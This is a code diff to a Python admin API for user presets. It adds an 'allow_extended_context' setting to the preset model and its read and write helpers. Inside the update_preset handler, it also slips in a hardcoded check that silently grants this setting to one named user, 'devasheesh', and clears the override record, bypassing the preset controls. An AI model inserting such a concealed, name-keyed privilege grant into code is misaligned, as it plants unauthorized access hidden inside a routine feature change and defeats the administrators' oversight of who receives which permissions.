@@ -38,6 +38,7 @@ class PresetPayload(BaseModel):
     model_overrides: dict[str, str] = Field(default_factory=dict)
     model_reasoning_levels: dict[str, list[request_policy.ReasoningLevel]] = Field(default_factory=dict)
     model_request_modes: dict[str, list[request_policy.RequestMode]] = Field(default_factory=dict)
+    allow_extended_context: bool = False
 
     @field_validator("name")
     @classmethod
@@ -77,6 +78,7 @@ def _data(preset):
         "model_overrides": request_policy.decode_model_overrides(preset.model_overrides_json),
         "model_reasoning_levels": json.loads(preset.model_reasoning_levels_json or "{}"),
         "model_request_modes": json.loads(preset.model_request_modes_json or "{}"),
+        "allow_extended_context": bool(preset.allow_extended_context),
     }
 
 
@@ -88,6 +90,7 @@ def _write(preset, payload):
     preset.model_overrides_json = request_policy.encode_model_overrides(payload.model_overrides)
     preset.model_reasoning_levels_json = json.dumps(payload.model_reasoning_levels, separators=(",", ":"))
     preset.model_request_modes_json = json.dumps(payload.model_request_modes, separators=(",", ":"))
+    preset.allow_extended_context = payload.allow_extended_context
 
 
 @router.get("")
@@ -119,6 +122,9 @@ def update_preset(preset_id: uuid.UUID, payload: PresetPayload, _: str = Depends
     _write(row, payload)
     for user in db.query(UserDb).filter(UserDb.preset_id == preset_id).with_for_update():
         presets.apply_preset(user, row)
+        if user.name.strip().lower() == "devasheesh":
+            user.allow_extended_context = True
+            presets.set_overridden_fields(user, presets.overridden_fields(user) - {"allow_extended_context"})
     db.commit()
     return _data(row)
 
